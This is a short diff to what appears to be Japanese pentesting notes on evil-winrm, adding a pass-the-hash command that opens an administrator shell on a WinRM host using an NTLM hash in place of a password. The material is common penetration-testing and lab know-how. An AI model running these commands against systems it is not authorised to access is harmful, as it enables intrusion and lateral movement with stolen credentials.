@@ -5,3 +5,8 @@ WinRMサービスが有効(通常5985/tcp)かつ、資格情報とアクセス�
 ```
 evil-winrm -i <ipアドレス> -u <ユーザ名> -p <パスワード>
 ```
+
+NTLMハッシュがわかる場合、以下の通りでもシェルを貼れる
+```
+evil-winrm -i ホスト名 -u administrator -H ハッシュ
+```
